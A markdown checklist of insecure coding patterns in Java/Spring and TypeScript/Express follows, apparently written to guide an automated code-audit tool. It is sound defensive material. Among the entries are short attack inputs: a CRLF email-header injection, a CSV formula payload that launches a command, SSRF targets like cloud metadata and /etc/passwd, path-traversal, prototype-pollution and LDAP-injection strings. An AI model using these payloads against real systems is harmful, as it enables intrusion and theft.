# Language-Specific Anti-Patterns

Patterns the ponytail-audit ladder should flag, discovered across 5 rounds of testing against TypeScript, Java, and JavaScript codebases.

## Java / Spring Boot

### Security
- **XXE in XML parsers:** `DocumentBuilderFactory.newInstance()` without disabling external entities and DTD processing.
- **Path traversal:** `new File(userPath)` without path validation or canonicalization.
- **Hardcoded credentials in application.properties:** DB passwords, JWT secrets, admin emails/passwords as literal values.
- **DDL auto-update:** `spring.jpa.hibernate.ddl-auto=update` in production — can drop/recreate tables.
- **CSRF disabled globally:** `.csrf(csrf -> csrf.disable())` without per-endpoint justification.
- **CORS * with credentials:** `setAllowedOrigins("*")` combined with `setAllowCredentials(true)`.
- **Session fixation:** `SessionCreationPolicy.IF_REQUIRED` without `.sessionFixation().migrateSession()`.
- **Missing security headers:** `.frameOptions(frame -> frame.disable())` — clickjacking. No HSTS, X-Content-Type-Options, X-Frame-Options set.
- **Insecure random:** `java.util.Random` instead of `java.security.SecureRandom` for tokens/passwords.
- **Timing attack:** `String.equals()` for password/token comparison instead of `MessageDigest.isEqual()`.
- **Static SimpleDateFormat:** Not thread-safe — concurrent access produces corrupted dates.
- **Log injection:** User input in log messages without sanitization.

### JPA / Database
- **Double for money:** `double` balance/price/totalAmount instead of `BigDecimal`. 0.1 + 0.2 != 0.3.
- **EAGER fetch on @OneToMany:** N+1 queries. Every entity load triggers a separate query for the collection.
- **LAZY fetch without @Transactional:** Throws `LazyInitializationException` — no session outside transaction.
- **Missing equals/hashCode on @Entity:** Two entities with same ID won't be equal in HashSet/HashMap.
- **Missing @Version:** No optimistic locking — concurrent updates silently overwrite.
- **DDL auto-update in production:** `spring.jpa.hibernate.ddl-auto=update` — schema changes without migration control.
- **Show SQL in production:** `spring.jpa.show-sql=true` — leaks query structure.
- **No pagination on findAll():** Returns all rows — memory exhaustion on large tables.

### Architecture
- **Field injection (@Autowired on field):** Hides dependencies, makes testing harder. Prefer constructor injection.
- **HashMap instead of ConcurrentHashMap:** In multi-threaded Spring context (singleton beans), HashMap corrupts under concurrent access.
- **Static mutable collections:** Caches, blacklists, rate-limit buckets as static HashMap/Map — grows unbounded, thread-unsafe.
- **boolean as lock:** `volatile boolean` for deduplication — not atomic. Double-checked locking broken.
- **BCrypt bean defined but never used:** `@Bean PasswordEncoder` in SecurityConfig while service uses SHA-256 via custom util.
- **No @PreAuthorize on controllers:** All endpoints public despite SecurityConfig existing.
- **Error handler returns stack traces:** `e.toString()` or `e.getMessage()` returned to client.
- **Silent null continuation:** `if (product == null) continue` in loops — skips items without surfacing errors, producing silently incomplete results.
- **Unsafe generic cache cast:** `(List<Product>) CacheUtil.get(...)` without `instanceof` check or generic type token — ClassCastException waiting to happen.
- **No account lockout on auth:** Zero failed-attempt tracking. Combined with no rate limiting, this enables unlimited brute force.
- **Plain string for constrained fields:** `String role` / `String status` instead of enum — any value accepted, no validation, typos become bugs.

### Repository / DAO
- **JPQL LIKE concatenation in repository:** `.searchByName("%" + query + "%")` passes user input concatenated with wildcards to `@Query`. While `@Param` prevents injection, the concatenation happens BEFORE parameter binding — a refactor to native query would be injectable.
- **Native queries without input validation:** `@Query(nativeQuery = true, value = "SELECT * FROM users WHERE role = :role")` — if the parameter is later concatenated instead of bound, it becomes SQL injection. Flag every `nativeQuery = true`.
- **No pagination on findAll():** All three repository patterns (JpaRepository.findAll(), derived finder, @Query) return ALL rows unless `Pageable` parameter is used.
- **countByXxx without @QueryHint:** Count queries on large tables without index hints can be slow.

### Entity / JPA
- **Missing @Min/@Max on numeric fields:** `int inventory` with no lower bound — accepts negative values silently.
- **Missing @Version on entity:** No optimistic locking — concurrent updates silently overwrite (last-write-wins).
- **EAGER fetch on @OneToMany without @BatchSize:** N+1 explosion unless batch fetching is configured.
- **LAZY fetch without @Transactional context:** Calling getters outside transaction throws LazyInitializationException.

### Build / Dependency Security
- **Missing OWASP dependency-check:** No `dependency-check-maven` plugin in pom.xml — known CVEs in dependencies go undetected.
- **show-sql in production:** `spring.jpa.show-sql=true` — leaks query structure and schema to logs.

### Security (continued)
- **Mail header injection:** User email/name interpolated into email headers without sanitization. Attacker email like `x@evil.com\r\nBcc: victim@company.com` injects arbitrary recipients. Flag every email construction where user data enters headers without CRLF stripping.
- **SMS/notification over HTTP:** `http://sms-gateway.internal/send?key=...` — API credentials in plaintext over unencrypted transport. Flag every notification call URL that uses `http://` with embedded credentials.
- **Notification deduplication missing:** `notifyOrderStatusChange()` without idempotency key — duplicate notifications on retry/status-change. Flag every notification dispatch without dedup tracking.
- **JWT alg:none bypass (Java):** `if (parts.length == 2)` accepts unsigned token — strips signature, trusts payload. Flag every JWT parser that accepts 2-part tokens without rejection.
- **JWT key confusion:** Algorithm from JWT header used directly in `Mac.getInstance(alg)` without allowlist. Attacker sets `alg: "HmacSHA1"` to downgrade, or public key as HMAC secret. Flag every JWT verifier that doesn't have a hardcoded algorithm allowlist.
- **Password hash in JWT payload:** `"pwd_hash": user.getPasswordHash()` included in token claims — credential leak readable by any token holder. Flag every JWT payload builder that includes password hash or secret fields.
- **JWT no expiry:** Token generated without `exp` claim — indefinite access if stolen. Flag every JWT without mandatory expiration.
- **JWT claims from refresh:** Refresh endpoint reuses old token's claims to generate new token — stolen token = indefinite renewal. Flag refresh handlers that don't validate and re-issue based on known-good state.
- **Actuator/info endpoint unsecured:** `/admin/health`, `/admin/metrics`, `/admin/info` returning DB table counts, JVM heap, system properties, internal IPs, app version to unauthenticated clients. Flag every health/info endpoint without auth that returns internal state.
- **Config dump endpoint:** `System.getenv()` or `@Value` properties returned as JSON — leaks DB passwords, API keys, all secrets. Flag any endpoint returning environment or property maps.
- **Mass assignment via @RequestBody entity:** `@RequestBody User user` — Spring binds all JSON fields to entity including `id`, `role`, `accountBalance`. Attacker sets hidden fields. Flag every controller that accepts an `@Entity` directly as `@RequestBody` instead of a DTO.
- **IDOR (Insecure Direct Object Reference):** `@GetMapping("/admin/users/{id}")` without checking that the requesting admin has permission for that specific user. Any admin can access any user. Flag every admin endpoint using user-supplied ID without ownership/permission verification.
- **Token generation bypass:** `@PostMapping("/admin/token")` generating JWT for arbitrary `userId` from request body — no verification the user exists or that the requester is authorized. Flag every token-issuance endpoint that accepts user identity from untrusted input.

### Concurrency / Resilience
- **@Scheduled without fixedDelay:** `@Scheduled(cron = "...")` without `fixedDelay` or `fixedRate` — if execution takes longer than the interval, overlapping instances run concurrently. Flag every bare `@Scheduled`.
- **No distributed lock on scheduled tasks:** In multi-instance deployments, `@Scheduled` fires on every node simultaneously without coordination. Data corruption or double-processing. Flag if task mutates state and no lock mechanism (ShedLock, Quartz, Redis lock) is present.
- **ThreadLocal not cleaned in finally:** ThreadLocal values persist across executions in thread-pooled environments (Tomcat, default async executor). If `set()` is called in `try` without `remove()` in `finally`, stale values leak between requests/executions.
- **ThreadLocal accessed from @Async thread:** Standard `ThreadLocal` values are NOT inherited by `@Async` threads. Only `InheritableThreadLocal` propagates to child threads. Flag `ThreadLocal.get()` inside `@Async` methods — result is always null.
- **@Async void — exceptions silently swallowed:** Spring's `SimpleAsyncUncaughtExceptionHandler` logs and discards exceptions from void `@Async` methods. No error propagation to caller. Flag every `@Async` method with void return type that lacks a custom `AsyncUncaughtExceptionHandler`.

### File I/O Security
- **CSV injection (formula injection):** User data written to CSV without escaping `=`, `+`, `-`, `@` prefixes. Excel/LibreOffice execute these as formulas. Attacker sets name to `=cmd|' /C calc'!A0`. Flag all CSV generation that doesn't prepend `'` to fields starting with formula-trigger characters.
- **Zip slip:** Extracting zip entries where `entry.getName()` contains `../` path traversal. `new File(destDir, entry.getName())` resolves to paths outside `destDir`. Must canonicalize and verify the resolved path starts with `destDir`. Flag every zip extraction without path validation.
- **Zip bomb:** No size limit on zip input stream — compressed kilobytes expand to gigabytes exhausting memory/disk. Flag every zip extraction without total size limits and per-entry size limits.
- **Download path traversal:** `Path.resolve(userFilename)` does NOT prevent traversal — `Path.of("/var/exports").resolve("../../../etc/passwd")` works. Must normalize and check `.startsWith(baseDir)`. Flag every file download/serve endpoint where the filename is user-supplied without canonicalization check.

### Webhook / Integration Security
- **HMAC on deserialized body:** Computing `HmacSHA256(payload.toString())` on a deserialized Map/JSON object instead of raw request bytes. Java object serialization, key ordering, and whitespace changes break HMAC verification. Always compute HMAC on the raw `InputStream` before deserialization. Flag every webhook endpoint that reads the body as an object before verifying the signature.
- **Optional webhook signature:** `if (signature != null && !signature.isEmpty())` — missing signature header results in accepted webhook rather than rejected. Flag every webhook endpoint where signature verification is conditional rather than mandatory.
- **Webhook secret entropy:** Short secrets with predictable prefixes (e.g., `whsec_abc123`) are brute-forceable. Minimum 256 bits of entropy. Flag webhook secrets under 32 random bytes.
- **Webhook idempotency missing:** No deduplication key or event ID tracking — replayed webhook events cause double-processing. Flag every webhook handler without idempotency storage.
- **Event type not validated against allowlist:** `switch (eventType)` dispatches to handlers without checking that `eventType` is in an explicit allowlist. Internal handlers (e.g., `order.refund.initiated`) exposed to external webhook callers. Flag every webhook handler using untrusted event type for dispatch.
- **Internal handlers triggered from webhooks:** Any service callback/handler method that exists in an `@Service` and is called from a webhook controller's event dispatch without an allowlist gate.

## TypeScript / Express

### Security
- **SQL injection via template strings:** `SELECT * FROM users WHERE email = '${email}'` — use parameterized queries.
- **JWT alg:none acceptance:** `jwt.verify(token, secret)` without specifying algorithms — attacker forges tokens.
- **Hardcoded JWT secret:** Literal string fallback in source code.
- **Hardcoded DB credentials:** `Pool({ password: 'db_p@ssw0rd_2024!' })` in source.
- **CORS * with credentials:** `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`.
- **Insecure cookies:** `res.cookie('session', token)` without `httpOnly: true`, `secure: true`, `sameSite: 'strict'`.
- **Session fixation:** Accepting session token from `req.body.sessionToken` without regeneration.
- **Weak password hashing:** `crypto.createHash('sha256')` without salt — should use bcrypt/argon2. SHA-256 is designed to be fast.
- **Math.random() for tokens:** `Math.random().toString(36)` — predictable. Use `crypto.randomBytes()`.
- **Timing attack:** `Set.has(token)` or `===` for API key/secret comparison. Not constant-time.
- **Environment info in health endpoint:** `process.memoryUsage()`, `process.env.NODE_ENV` returned to unauthenticated clients.
- **Stack traces to client:** `err.stack` in error responses. Leaks file paths and internal logic.
- **X-Powered-By header:** Leaks technology stack. Remove or genericize.

### Data / Async
- **Floating point for money:** `number` for prices/balances instead of integer cents or Decimal.
- **No body size limit:** `express.json()` without `limit` option, or `limit: '50mb'` — DoS via large payloads.
- **Unbounded collections:** `Map`/`Set` growing without eviction — memory leak in long-lived processes.
- **Race condition — check-then-act:** Boolean flag checked then set in non-atomic async gap.
- **Race condition — inventory:** Read inventory → calculate new → write inventory. Not atomic between read and write.
- **Connection never released:** `pool.connect()` without `client.release()`. Connection pool exhaustion.
- **No pool max size:** `new Pool({})` without `max` — unlimited connections under load.
- **void promise without catch:** `void asyncFunction()` — error silently swallowed.
- **Empty catch blocks:** `try { ... } catch { }` — swallows all errors including critical failures.

### Architecture
- **Missing auth on some routes:** Compare all routes — if `/api/payments` has auth but `/api/refunds` doesn't, flag as HIGH.
- **Missing rate limiting on some routes:** Same cross-file comparison pattern.
- **Centralized errors unused:** `errorResponse()` defined in `errors.ts` but some routes build errors inline.
- **Dead validation:** `validatePayment()` always returns `{ valid: true, errors: [] }`. Guard branch unreachable.
- **Dead enums/interfaces:** `UserRole` enum defined but never enforced. `PaymentProcessor` interface with single implementation.
- **Dead imports:** `import { isValidEmail } from ...` but `isValidEmail` is never called by any route or service. Check every import against actual usage.
- **Password hash returned to client:** `res.json(user)` includes `passwordHash` field.
- **Single placeholder test:** `expect(true).toBe(true)` — zero business logic coverage.
- **No pagination on list endpoints:** Returns all rows regardless of table size.
- **Regex DoS:** `/(a+)+$/` — nested quantifiers cause catastrophic backtracking on crafted input.
- **User input in template strings without encoding:** `${req.body.name}` in SQL or URLs without `encodeURIComponent()`.
- **Silent null continuation:** `if (!product) continue` in async loops — missing items silently, producing incomplete results.
- **No account lockout on auth:** Zero failed-attempt tracking. Combined with no rate limiting, enables unlimited credential stuffing.
- **Missing dependency scanning:** No `npm audit` in CI/scripts, no Snyk/Dependabot config.
- **Path traversal via user input:** `path.join(baseDir, req.query.file)` without checking that the resolved path stays within the base directory. `path.join` does not prevent traversal — `path.join('/uploads', '../../../etc/passwd')` resolves to `/etc/passwd`.
- **SSRF via user-controlled URL:** `http.get(req.body.url)` without protocol validation, host allowlist, or internal IP blocking. Attacker can target `http://169.254.169.254/` (AWS metadata), `http://localhost:3000/admin`, or `file:///etc/passwd`.
- **SSRF missing safeguards:** No request timeout, no redirect limit, no max response size — attacker can exhaust memory or hang the server.
- **Prototype pollution:** `for (const key in source) target[key] = source[key]` with recursive merge on user-supplied objects. Attacker sends `{"__proto__": {"isAdmin": true}}` to poison `Object.prototype`. Must block `__proto__`, `constructor`, and `prototype` keys.
- **Webhook signature verification missing or bypassed:** `const sig = req.headers['stripe-signature']` checked with commented-out code or only when header is present. All webhooks must verify signatures with constant-time comparison.
- **Webhook replay attack:** No idempotency key tracking, or in-memory dedup store lost on restart. Attacker replays captured webhook events for double-processing.
- **Webhook event type injection:** `switch (req.body.type)` dispatches to handlers without validating event type against an allowlist. Attacker can trigger internal handlers with crafted event types.
- **SHA-1 for signatures:** `crypto.createHmac('sha1', secret)` — SHA-1 is deprecated and collision-vulnerable. Use SHA-256 or better.
- **File upload without limits:** `fs.writeFileSync(path.join(UPLOAD_DIR, req.body.filename), req.body.data)` — no size limit, no type validation, user-controlled filename enables arbitrary filesystem writes.
- **Directory listing exposure:** `fs.readdir(UPLOAD_DIR)` without authentication — leaks all uploaded files to anyone.

### API Key Management (TypeScript/Node)
- **API key accepted via query parameter:** `req.query.api_key` — appears in proxy logs, browser history, access logs, and `Referer` headers. API keys must be sent in `Authorization` header only.
- **API keys stored in plaintext:** `Map<string, { userId, scopes }>` — keys must be hashed with bcrypt/scrypt before storage. An in-memory plaintext store means a memory dump exposes all keys.
- **Weak API key generation:** `Math.random().toString(16).substring(2, 10)` or `crypto.randomBytes(4).toString('hex')` — 32 bits of entropy is brute-forceable in seconds. Minimum 128 bits via `crypto.randomBytes(16).toString('hex')`.
- **Non-constant-time key comparison:** `keyStore.get(key)` returns entry or null — Map lookup timing differs between hit and miss. Attacker can measure response time to enumerate valid keys. Use `crypto.timingSafeEqual` on hashed keys.
- **No key scoping / default `*` scope:** Every API key gets full access by default. Keys should have granular scopes (`read:users`, `write:orders`) validated per endpoint.
- **No key rotation or expiration:** Keys live forever with no forced rotation. Flag any API key system without `expiresAt`, `rotatedAt`, or forced rotation policy.
- **No usage tracking:** Cannot detect compromised keys — no `lastUsed`, `requestCount`, or IP-anomaly detection. Flag if key metadata lacks usage fields.
- **Key revocation without audit log:** `keyStore.delete(key)` with no record of who revoked it or when. Flag revocation operations without audit trail.
- **listApiKeys returns other users' keys:** Iterates all keys in store without filtering by owner. Flag any list operation that ignores ownership.
- **Key collision risk:** 32-bit keys with no uniqueness check — two users can receive identical keys. Flag key generation without a retry-on-collision loop.

### Content-Type Validation (Express)
- **Content-Type blacklist instead of allowlist:** `const BLOCKED = ['application/xml']; if (BLOCKED.includes(ct)) reject()` — any unknown Content-Type passes. Must use allowlist: `const ALLOWED = ['application/json']; if (!ALLOWED.includes(ct)) reject()`.
- **Blacklist bypass via charset parameter:** `'application/xml; charset=utf-8' !== 'application/xml'` — string equality misses parameterized variants. Must parse the MIME type before checking.
- **No charset validation:** Accepts arbitrary charsets like `application/json; charset=gb2312` — causes encoding confusion in downstream parsers. Flag when Content-Type is accepted without charset allowlist.
- **Empty Content-Type accepted:** `if (!contentType) return next()` — request with no Content-Type should be rejected (400), not silently passed through.
- **Loose MIME type check:** `contentType.includes('json')` — matches `application/json-patch+json`, `text/x-json`, even malicious types. Must use exact prefix match: `contentType.startsWith('application/json')`.
- **User-controlled Content-Type in error response:** `res.status(400).json({ error: \`Unsupported Content-Type: ${contentType}\` })` — log injection. Attacker sets `Content-Type: \n[CRITICAL] System compromised` to inject fake log entries.

### Multipart Upload Validation (Express)
- **No boundary validation:** `contentType.split('boundary=')[1]` without checking for CRLF injection, length limits, or special characters. Crafted boundaries can confuse parsers or cause DoS.
- **No file count limit:** Multipart form accepts unlimited file parts — attacker sends 10,000 files exhausting disk/memory. Flag multipart handlers without `maxFiles` or `maxParts`.
- **No individual file size limit:** Single file can be arbitrarily large in a multipart request. Flag multipart configs without `maxFileSize` per file.
- **No total request size in multipart:** Even with per-file limits, total of many files can exceed memory. Flag when multipart is accepted without an overall `limits.fileSize` or body parser `limit`.

### GraphQL Security (Express/Apollo)
- **Introspection enabled in production:** `req.body.query` containing `__schema` returns full schema — exposes all types, fields (including `passwordHash`), mutations, and internal/admin types. Flag any GraphQL endpoint that responds to introspection queries.
- **No query depth limit:** Attacker sends deeply nested queries (`{ users { orders { items { product { reviews { user { ... } } } } } }`) — exponential data fetch. Flag GraphQL servers without `maxDepth` validation.
- **No query complexity limit:** Attacker requests millions of nodes through aliases or fragments — DoS via CPU/memory exhaustion. Flag when complexity analysis (cost scores per field) is absent.
- **No batching attack prevention:** Single HTTP request containing multiple GraphQL queries — bypasses HTTP-level rate limiting. Flag when `batch: true` or array queries are accepted without per-request query count limits.

### Bulk Operation Safety (Express)
- **Bulk delete/update with no confirmation:** `DELETE /api/admin/users` with `{ userIds: [...] }` executes immediately — no confirmation step for destructive operations. Flag bulk mutation endpoints without a `confirm: true` requirement.
- **No transaction on bulk operations:** Multiple rows deleted/updated in sequence — partial failure leaves orphaned data. Flag bulk mutations without explicit transaction wrapping.
- **No audit logging on destructive operations:** Bulk delete of users with no record of who performed it, when, or which IDs. Flag admin write endpoints without audit trail writes.
- **Array parameter not validated:** `userIds.join(',')` — array could be empty (deletes nothing silently), contain millions of entries (DoS), or contain duplicate IDs (inefficient). Flag bulk endpoints without min/max array length checks.
- **SQL injection via array join:** `userIds.join(',')` interpolated into `WHERE id IN (${ids})` — if any array element contains SQL, it's injected. Must use parameterized queries: `WHERE id = ANY($1)` with array param.

### File Upload Security (Java)

- **No file size limit configured:** `spring.servlet.multipart.max-file-size` not set in application.properties — DoS via multi-gigabyte upload. Flag when `MultipartFile` is accepted without any size enforcement at the servlet or application level.
- **Path traversal via filename:** `Paths.get(UPLOAD_DIR + originalFilename)` without canonicalization — user-supplied filename with `../` escapes the upload directory. `Paths.get` does NOT prevent traversal. Must normalize and verify `.startsWith(baseDir)`. Flag every file write where the filename comes from `MultipartFile.getOriginalFilename()` without path validation.
- **No magic number / MIME type validation:** Trusting `MultipartFile.getContentType()` — this header is set by the client and can be anything. Same for `Files.probeContentType()`. Must validate file content via magic bytes (first N bytes of the file stream). Flag when file type is determined from client-supplied headers only.
- **Double extension bypass:** `file.jsp.jpg` — extension check on the last dot passes `.jpg` allowlist, but the file is a JSP. Web servers that map by first extension (Apache mod_mime) will execute it. Flag extension allowlists that only check the trailing segment.
- **Null byte injection:** `file.jsp%00.jpg` — null byte in filename. Java truncates at null for some APIs but the filesystem name includes the full string. Depends on OS/filesystem. Flag when filenames are not sanitized for null bytes and control characters.
- **Extension check is case-sensitive:** `file.JSP` bypasses a block on `.jsp` if the check uses `.equals()` instead of `.equalsIgnoreCase()`. Flag case-sensitive extension validation.
- **Zip slip:** `new File(destDir, entry.getName())` without canonicalization — zip entry with name `../../../etc/crontab` writes outside the target directory. Must resolve canonical path and verify it starts with the canonical destDir prefix. Flag every zip extraction without entry path validation.
- **Zip bomb:** No limits on `ZipInputStream` — compressed kilobytes expand to gigabytes. Must enforce max uncompressed size, max entry count, and max compression ratio (e.g., reject if compressed:uncompressed ratio exceeds 1:100). Flag zip extraction without size/ratio/entry-count limits.
- **Polyglot file detection bypass:** Validating only the first 4 magic bytes — a polyglot file can have valid JPEG header + embedded JSP payload. Must validate that the entire file content matches the expected type, not just the header. Flag magic-byte-only validation without deep content inspection.
- **Temporary file without secure permissions:** `File.createTempFile()` without explicit `setReadable/setWritable` — world-readable on multi-tenant systems. Must restrict permissions to owner-only. Flag temp files without explicit permission setting.
- **No deleteOnExit for temp files:** Temp files accumulate indefinitely, disk exhaustion. Must call `deleteOnExit()` or use try-finally cleanup. Flag temp file creation without lifecycle management.
- **Virus scanning gap:** User-uploaded files stored/served without AV scan — ransomware, malware distribution vector. Flag when uploaded files pass through to storage without any malware scanning step.
- **No quota enforcement per user:** One user can exhaust all available storage. Must enforce per-user upload limits and total storage accounting. Flag when upload handlers lack per-user quota tracking.
- **Concurrent upload race:** Two threads writing to the same filename (e.g., using `System.currentTimeMillis()` for uniqueness) — not unique under concurrent requests, data corruption. Flag non-unique filename generation strategies.
- **Content-Type spoofing:** `file.getContentType()` from client trusted for authorization — attacker sets `Content-Type: image/jpeg` on a `.jsp` file. Must validate content, not declared type. Flag any MIME-type-based gating without content inspection.

### Cryptographic Implementation Anti-Patterns (Java)

- **Hardcoded symmetric key in source:** `private static final String AES_KEY = "MySecretKey12345"` — key in source code, visible to anyone with repo access. Must come from env, vault, or HSM. Flag every literal string used as encryption key.
- **AES in ECB mode:** `Cipher.getInstance("AES/ECB/PKCS5Padding")` — identical plaintext blocks produce identical ciphertext blocks. Penguin/Tux ECB-encrypted image reveals the original image structure. Must use CBC, GCM, or CTR mode. Flag every use of ECB mode for encryption.
- **Static IV reused across encryptions:** `new IvParameterSpec(STATIC_IV)` — same IV every time. In CBC mode, the first ciphertext block is predictable (XOR of known IV with plaintext). In GCM, static IV breaks authentication entirely. IV must be random and unique per encryption. Flag every hardcoded/reused IV.
- **Weak key derivation — no PBKDF2/bcrypt/scrypt:** `password.getBytes()` as AES key — raw password bytes used directly. Short passwords produce weak keys; no salt; no stretching. Must use PBKDF2WithHmacSHA256 with high iteration count, or scrypt/Argon2. Flag key derivation from raw password bytes.
- **Zero-padded passwords as keys:** Padding short passwords with null bytes — predictable key structure reduces entropy. Flag manual key padding instead of proper key derivation.
- **DES algorithm (56-bit):** `KeyGenerator.getInstance("DES")` — 56-bit key is brute-forceable in hours. DES was deprecated by NIST in 2005. Must use AES (128/256-bit). Flag every use of DES or 3DES.
- **RSA with NoPadding:** `Cipher.getInstance("RSA/NONE/NoPadding")` — deterministic encryption, vulnerable to chosen-plaintext attacks. Must use OAEP padding.
- **RSA with PKCS1 v1.5 padding:** `Cipher.getInstance("RSA/ECB/PKCS1Padding")` — vulnerable to Bleichenbacher's chosen-ciphertext attack (CCA). Must use OAEP (e.g., `RSA/ECB/OAEPWithSHA-256AndMGF1Padding`). Flag every use of PKCS1Padding with RSA.
- **java.util.Random for cryptographic IV/key generation:** `new Random().nextBytes(iv)` — `java.util.Random` is a linear congruential generator, predictable after observing a few outputs. Must use `SecureRandom` for any cryptographic material. Flag every `Random` used in crypto contexts.
- **No authentication tag (MAC/GCM):** Encrypting with CBC mode without HMAC — ciphertext can be modified without detection (padding oracle, bit-flipping). Must use authenticated encryption: GCM mode, or encrypt-then-MAC with HMAC-SHA256. Flag any encryption without authentication.
- **Algorithm downgrade possible:** `Cipher.getInstance(userAlgorithm)` — user-controlled cipher algorithm string. Attacker forces `"DES/ECB/NoPadding"` or `"AES/ECB/NoPadding"`. Must hardcode the algorithm or validate against an allowlist. Flag any cipher selection from user input.
- **No key rotation:** Same encryption key used for all data since system inception — a single key compromise exposes all historical data. Must implement key versioning, rotation schedule, and key expiration. Flag crypto systems without key rotation infrastructure.
- **Crypto exception silently swallowed:** `catch (Exception e) { return null; }` in encryption method — caller gets null and assumes encryption failed (but maybe it partially succeeded and the error is unrelated). Must propagate or handle explicitly. Flag silent crypto exception suppression.
- **Debug logging of encrypted output:** `System.out.println("Encrypted: " + ciphertext)` — ciphertext in logs enables offline analysis, key recovery attempts. Flag logging of ciphertext or cryptographic material.

### LDAP / Directory Service Security (Java)

- **LDAP over plaintext (no LDAPS):** `ldap://dc.internal:389` — credentials and data in cleartext on the network. Must use `ldaps://` on port 636 or StartTLS. Flag every `ldap://` provider URL.
- **Hardcoded LDAP admin credentials:** Bind DN and password as string literals in source — full directory admin access if source leaks. Must use externalized config. Flag hardcoded principal/credentials in JNDI connection setup.
- **LDAP filter injection via string concatenation:** `"(&(uid=" + username + ")(objectClass=person))"` — user input concatenated into LDAP filter without escaping. Attacker injects `*` (match-all), `admin)(|(uid=admin)` (OR-clause injection), or `*))(|(uid=*` (parenthesis injection). Must escape special characters per RFC 4515: `*`, `(`, `)`, `\`, `NUL`. Use parameterized LDAP queries or proper encoding library. Flag every string-concatenated LDAP filter with user input.
- **DN injection:** `"uid=" + uid + ",ou=users,dc=com"` — user-controlled UID in DN construction. Attacker supplies `admin,ou=admins` to traverse to a different DN. Must escape DN special characters: `+`, `,`, `;`, `<`, `>`, `=`, `\`, `"`, `#`. Flag every DN built from user input without escaping.
- **Anonymous bind for initial search:** `env.put(SecurityAuthentication, "none")` — allows unauthenticated directory enumeration. Initial search should use a read-only service account with minimal privileges. Flag anonymous binds.
- **No search result count limit:** `SearchControls` without `setCountLimit()` — wildcard search returns entire directory, OOM. Must enforce `setCountLimit(100)` or similar. Flag unbounded LDAP searches.
- **No search time limit:** `SearchControls` without `setTimeLimit()` — complex filter can run indefinitely on large directory. Must set `setTimeLimit(5000)`. Flag unlimited search time.
- **SUBTREE scope without restrictions:** `SearchControls.SUBTREE_SCOPE` traverses entire directory tree — every OU, every entry. Combined with no count/time limits, this is a DoS vector. Must justify SUBTREE use or scope to ONELEVEL. Flag unguarded SUBTREE searches.
- **Password hash attribute exposure:** `ctx.getAttributes(userDn)` returning ALL attributes — `userPassword`, `sambaNTPassword`, `unicodePwd` included. Must specify `setReturningAttributes()` to only return needed fields. Flag LDAP attribute queries without explicit return attribute lists.
- **LDAPS without certificate validation:** `env.put("java.naming.ldap.factory.socket", "javax.net.ssl.SSLSocketFactory")` with no custom `TrustManager` — accepts any certificate, MITM-vulnerable. Must configure a custom `SSLSocketFactory` with proper truststore validation. Flag LDAPS connections without explicit certificate validation.
- **Blind LDAP injection — user enumeration:** `"(uid=" + username + ")"` — response differs between valid and invalid usernames (timing, result count, error). Attacker enumerates accounts. Must use constant-time responses and rate limiting. Flag user-existence queries that reveal account validity.
- **No connection pooling:** New `InitialDirContext` per request — connection setup overhead, resource exhaustion under load. JNDI supports connection pooling via `com.sun.jndi.ldap.connect.pool=true`. Flag when LDAP connections are created per-request without pooling.
- **No referral following control:** `Context.REFERRAL` not set to `"ignore"` — LDAP server can redirect to attacker-controlled server. Must explicitly set `Context.REFERRAL = "ignore"` or validate referral URLs. Flag when referral handling is left at default.
- **No connection timeout:** `com.sun.jndi.ldap.connect.timeout` and `read.timeout` not set — hangs indefinitely on unreachable LDAP server. Must set explicit timeouts. Flag JNDI connections without timeout configuration.
- **LDAP error message leaked to client:** `e.getMessage()` from `NamingException` returned in response — reveals directory structure, DN format, and server details. Flag LDAP exception messages in HTTP responses.

### Email / SMTP Security (Java)

- **Hardcoded SMTP credentials:** `SMTP_PASS = "Pr0d_P@ss!"` in source — credentials visible to anyone with repo access. Must use env vars or vault.
- **SMTP on port 25 — no TLS/STARTTLS:** Credentials and email content sent in cleartext. Must use port 587 with STARTTLS or port 465 with SSL/TLS. Flag `mail.smtp.port=25` without `mail.smtp.starttls.enable=true`.
- **No DKIM signing configured:** Emails lack DKIM signature — recipient servers cannot verify sender authenticity. Flag email services without DKIM key loading and signing step.
- **No DMARC policy:** No DMARC DNS record — receivers have no policy for DKIM/SPF failures. Flag systems that send email without a published DMARC record.
- **No SPF record:** No SPF DNS record — any server can spoof @yourdomain.com emails. Flag domains used in `From` addresses without SPF.
- **CRLF injection in email headers:** `InternetAddress.parse(userEmail)` directly from user input — attacker injects `\r\nBcc: victim@company.com` to add arbitrary recipients. Must strip `\r` and `\n` from all user-supplied values before header construction.
- **HTML injection in email body:** `"<p>Hello " + userName + "</p>"` — attacker sets userName to `<script>...</script>`. HTML-escape all user content in email bodies.
- **Missing unsubscribe link / List-Unsubscribe header:** Commercial/bulk emails without one-click unsubscribe — CAN-SPAM/GDPR violation. Flag transactional and marketing emails without unsubscribe mechanism.
- **Marketing without opt-in verification:** Promotional emails sent without checking consent status — GDPR requires explicit opt-in. Flag marketing methods that don't verify subscription status.
- **BCC used for batch sending:** `message.addRecipients(RecipientType.BCC, allEmails)` — reveals all recipient addresses to all recipients in email headers. Use individual sends or a mailing service.
- **No rate limiting on bulk send:** Loop sending to thousands of recipients — SMTP server DoS. Must throttle and use a queue.
- **Attachment from user input without validation:** `attachmentPart.setContent(userData, "application/octet-stream")` — no malware scan, no content-type validation, user-controlled filename. Flag attachment methods without AV scanning and type allowlisting.
- **Session debug mode in production:** `session.setDebug(true)` — SMTP protocol exchange and credentials dumped to stdout. Flag debug mode enabled in non-development environments.
- **No retry/backoff on SMTP failures:** `Transport.send()` in try-catch with no retry — transient failures cause permanent email loss. Must retry with exponential backoff.
- **Logging full email content:** `logger.info("Email sent: {}", emailContent)` — reset tokens, PII, and full email body in logs. Flag email content in log messages.

### Logging / Audit Security (Java)

- **Audit log file with insecure permissions:** `new File("/var/log/audit.log")` without `setReadable(false, false)` — world-readable by default. Must restrict to owner-only.
- **In-memory audit buffer unbounded:** `List<String> auditBuffer = new ArrayList<>()` — grows indefinitely with no eviction. Must have max size, ring buffer, or periodic flush.
- **Security log not separated from application log:** Login failures, admin actions, and permission changes in same logger as debug/info — SIEM can't distinguish. Must use separate logger with dedicated appender.
- **Synchronous file writes on every audit event:** `new FileWriter(auditLog, true)` in request thread — blocks response. Must use async appender or buffer with periodic flush.
- **No flush/fsync after audit write:** Data in Java's buffer but not on disk — crash loses audit trail. Must `flush()` + `FileDescriptor.sync()` or use `StandardOpenOption.SYNC`.
